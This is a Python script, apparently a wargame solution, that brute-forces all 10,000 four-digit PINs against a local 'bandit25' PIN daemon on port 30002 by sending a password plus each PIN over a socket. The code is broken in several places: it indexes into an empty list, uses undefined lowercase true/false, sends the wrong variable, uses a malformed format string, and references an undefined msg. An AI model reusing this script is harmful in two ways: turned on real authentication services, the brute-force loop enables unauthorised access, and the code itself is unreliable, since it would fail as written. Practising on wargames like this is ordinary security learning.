#!/usr/bin/env python3
import os
import socket
import time

def main():
    print("Starting brute force of bandit25 PIN daemon")
    target = ("127.0.0.1", 30002)
    pin_stats = []
    for pin in range(0,10000):
        pin_stats[pin] = test_pin(target, pin, b"")

def test_pin(host_port, pin, pw):
    # create and connect socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(host_port)
    
    test_phrase = "%s %0000d" % (pw, pin)
    # send password from previous level + PIN
    totalsent = 0
    while totalsent < len(test_phrase):
        sent = s.send(pw[totalsent:])
        if sent == 0:
            return (pin, false, "")
        totalsent = totalsent + sent

    # loop over received data, waiting a couple seconds between each run. 
    all_recv = []
    msg = b''
    runs = 0
    while runs < 10:
        runs = runs + 1
        chunk = s.recv(2048) 
        all_recv.append(chunk)
        # check finished or if 10 seconds go without data, close socket and end function
        if chunk == 0 or chunk == b'':
            msg = b''.join(all_recv) 
            break

    # return pin and whether it had the password
    return (pin, *check_for_password(msg))

def check_for_password(data):
    # convert bytes to string and check if it doesn't contain error output
    # if no error output, return string of received data
    """filler function"""
    msg_str = str.encode(msg, 'utf-8')
    # check received_data for password
    if "Wrong!" not in msg_str:
        # if found, return tuple of (pin, true, received_data_as_string)
        return (true, msg_str)
    
    # if not, return tuple of (pin, false, "")
    return (false, msg_str)

if __name__ == "__main__":
    # only allow this to run as a script
    main()
